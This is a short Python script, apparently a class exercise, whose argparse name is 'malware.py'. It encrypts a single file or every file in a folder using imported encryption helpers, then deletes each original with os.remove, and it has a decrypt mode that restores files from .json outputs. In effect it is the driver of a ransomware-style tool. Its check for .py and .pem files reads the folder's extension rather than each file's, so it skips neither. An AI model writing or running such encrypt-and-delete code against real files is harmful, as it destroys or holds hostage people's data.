import os
import sys
import argparse

from FileEncryptMac import my_encrypt
from FileDecryptMac import my_decrypt

def get_files_in_dir(path: str) -> set:
    files = set()
    raw_dir = os.listdir(path)
    for item in raw_dir:
        _, ext = os.path.splitext(os.path.basename(path))
        if ext not in ('.py', '.pem'):
            full_path = os.path.join(path, item)
            if os.path.isfile(full_path):
                files.add(full_path)
    return files

def get_jsons_in_dir(path: str) -> set:
    files = get_files_in_dir(path)
    json_files = set()
    for a_file in files:
        _, ext = os.path.splitext(os.path.basename(a_file))
        if ext == '.json':
            json_files.add(a_file)
    return json_files

def main():
    parser = argparse.ArgumentParser(
        prog="malware.py",
        description="Peform encryption/decryption operations")
    parser.add_argument(
        'input',
        type=str,
        help='Input file')
    parser.add_argument(
        '-d', '--decrypt',
        action='store_true',
        help="Set the program in decryption mode")
    parser.add_argument(
        '-F', '--folder',
        action='store_true',
        help="Specify that the target is a folder")
    args = parser.parse_args(sys.argv[1:])
    if args.decrypt:
        if args.folder:
            jsons = get_jsons_in_dir(args.input)
            for a_json in jsons:
                my_decrypt(a_json)
                os.remove(a_json)
        else:
            my_decrypt(args.input)
            os.remove(args.input)
    else:
        if args.folder:
            files = get_files_in_dir(args.input)
            for a_file in files:
                my_encrypt(a_file)
                os.remove(a_file)
        else:
            my_encrypt(args.input)
            os.remove(args.input)

if __name__ == "__main__":
    main()
